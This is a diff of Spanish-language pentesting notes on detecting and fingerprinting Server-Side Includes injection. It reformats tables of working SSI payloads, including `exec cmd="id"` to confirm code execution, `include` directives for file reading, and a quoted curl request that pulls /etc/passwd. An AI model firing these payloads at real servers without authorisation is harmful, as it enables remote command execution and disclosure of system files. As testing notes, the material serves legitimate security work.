@@ -20,46 +20,36 @@ linked:
 
 ## Identificar SSI Habilitado
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
-|:---:|:---:|:---:|
-| Extensión `.shtml` | URL path con `.shtml` / `.shtm` / `.stm` | Apache/IIS handler default. |
-| Server header | `Server: Apache/2.x` con mod_include | Apache stack. |
-| Server header | `Server: Microsoft-IIS/x.y` con SSI module | IIS. |
-| `.htaccess` `Options +Includes` | If accessible | Direct config. |
-| Apache `AddHandler server-parsed .shtml` | Config indicator | Standard. |
-| Custom MIME `text/x-server-parsed-html` | Per-config | Edge. |
-| Apache `mod_include` listed | `apachectl -M` shows include_module | Server-side enum. |
-| IIS handler mappings | `.shtml` mapped a SSI module | IIS Manager. |
-| Page rendered fecha automática | `DATE_LOCAL` rendered | SSI active. |
-| Legacy CMS / static sites | Old apps con SSI | Common. |
-| Educational tutorials | Many basic tutorials use SSI | OSINT clue. |
-| File listing reveals .shtml | Directory indexing exposes | Recon. |
-| `stat` con `s` extension | `.shtml` files in repo | Source disclosure. |
-| Wayback Machine | Historical .shtml URLs | OSINT. |
+| **Indicador** | **Qué significa** | **Dónde mirar** |
+|---|---|---|
+| Extensión `.shtml` / `.shtm` / `.stm` | Handler SSI por defecto (Apache/IIS) | URL path |
+| `Server: Apache` con `mod_include` | Stack Apache con SSI | Response headers |
+| `Server: Microsoft-IIS` con SSI module | IIS con SSI | Response headers |
+| `Options +Includes` / `AddHandler server-parsed` | SSI habilitado | `.htaccess` / vhost (si accesible) |
+| MIME `text/x-server-parsed-html` | Contenido parseado por el server | Response `Content-Type` |
+| Fecha auto-renderizada | `DATE_LOCAL` se procesa | Página muestra fecha sin JS |
+| `.shtml` en directory listing / Wayback | URLs históricas o indexadas | Indexing / OSINT |
+| CMS legacy / tutoriales educativos | Apps viejas suelen usar SSI | Recon contextual |
+
 ^ssi-detect-enabled
 
 ---
 
 ## Probes Iniciales
 
-| **Probe** | **Payload** | **Indicator** |
-|:---:|:---:|:---:|
-| Standard date probe | `<!--#echo var="DATE_LOCAL" -->` | Renders fecha → SSI activo. |
-| Document name probe | `<!--#echo var="DOCUMENT_NAME" -->` | Filename rendered. |
-| Server software | `<!--#echo var="SERVER_SOFTWARE" -->` | Apache/IIS version. |
-| Document root | `<!--#echo var="DOCUMENT_ROOT" -->` | Filesystem path. |
-| Request URI | `<!--#echo var="REQUEST_URI" -->` | URL path reflected. |
-| Inject en form fields | Search, contact, comments | Common injection point. |
-| Inject en URL params | `?q=<!--#echo...-->` | Reflected vector. |
-| Inject en User-Agent | If logged en .shtml | Header reflection. |
-| Inject en filename | Upload con SSI en filename | Edge. |
-| Probe error message | Invalid SSI → `[an error occurred while processing this directive]` | Confirms parser active. |
-| Subtle probe | `<!--#config sizefmt="bytes"-->` | Sets var, no visible output. |
-| HTML comment vs SSI | Plain HTML comment `<!-- -->` ignored, SSI `<!--#` parsed | Differential. |
-| Confirm exec capability | `<!--#exec cmd="id"-->` | If runs → RCE-grade. |
-| Confirm include | `<!--#include virtual="/index.html"-->` | If renders → file read. |
-| Combine con file upload | Upload `.shtml` con SSI | Multi-vector. |
+| **Comando** | **Qué confirma** | **Indicador** |
+|---|---|---|
+| `<!--#echo var="DATE_LOCAL" -->` | SSI activo | Renderiza la fecha |
+| `<!--#echo var="DOCUMENT_NAME" -->` | SSI activo | Muestra el filename |
+| `<!--#echo var="SERVER_SOFTWARE" -->` | Server + versión | `Apache/x.y` o `Microsoft-IIS/x.y` |
+| `<!--#echo var="DOCUMENT_ROOT" -->` | Webroot | Path del filesystem |
+| `<!--#config sizefmt="bytes" -->` | `#config` se procesa | Sin output visible (setea, no imprime) |
+| `<!--#exec cmd="id" -->` | Capacidad de RCE | `uid=...` en la respuesta |
+| `<!--#include virtual="/index.html" -->` | Capacidad de file read | Renderiza el incluido |
+
 ^ssi-detect-probes
+
+> [!note] Un comentario HTML plano `<!-- -->` se ignora; `<!--#` se parsea → diferencial. Un directive inválido devuelve `[an error occurred while processing this directive]` → confirma que el parser está activo. Probá en form fields, params de URL y headers (`User-Agent`/`Referer`) si se loguean en un `.shtml`.
 
 ### Quick probe workflow
 
@@ -88,24 +78,16 @@ curl -s "$TARGET?q=<!--%23include+file=%22/etc/passwd%22+-->"
 
 ## Fingerprint del Server (Recon Profundo)
 
-| **Variable** | **Probe** | **Info** |
-|:---:|:---:|:---:|
-| `SERVER_SOFTWARE` | Server full version | CVE lookup. |
-| `SERVER_NAME` | Hostname | Network recon. |
-| `SERVER_PORT` | Port 80/443 | Standard. |
-| `SERVER_PROTOCOL` | HTTP/1.1 / HTTP/2 | Stack version. |
-| `DOCUMENT_ROOT` | Webroot abs path | LFI chain. |
-| `SCRIPT_FILENAME` | Path al `.shtml` actual | Filesystem layout. |
-| `REMOTE_USER` | User auth HTTP | If basic auth. |
-| `HTTP_USER_AGENT` | Cliente UA | Self-recon. |
-| `HTTP_REFERER` | Source page | Recon. |
-| `HTTP_COOKIE` | Cookies actuales | Self-recon. |
-| `PATH_INFO` | Extra path | Edge config. |
-| `QUERY_STRING` | Raw query string | Reflection. |
-| All env vars | `<!--#printenv -->` | Full dump. |
-| Identify webroot | DOCUMENT_ROOT → LFI base | Standard. |
-| Identify CGI capability | If CGI configured | Combine vector. |
-| Identify SSL state | `HTTPS=on` env var | Edge. |
+| **Comando** | **Info** | **Uso** |
+|---|---|---|
+| `<!--#echo var="SERVER_SOFTWARE" -->` | Versión completa del server | Lookup de CVEs |
+| `<!--#echo var="SERVER_NAME" -->` | Hostname | Recon de red |
+| `<!--#echo var="DOCUMENT_ROOT" -->` | Webroot absoluto | Base para LFI/traversal |
+| `<!--#echo var="SCRIPT_FILENAME" -->` | Path del `.shtml` actual | Layout del filesystem |
+| `<!--#echo var="REMOTE_USER" -->` | Usuario de Basic Auth | Si hay auth HTTP |
+| `<!--#echo var="HTTPS" -->` | Estado SSL (`on`/off) | Edge |
+| `<!--#printenv -->` | Dump completo de env vars | Recon de una pasada |
+
 ^ssi-detect-fingerprint
 
 ### Workflow recon profundo
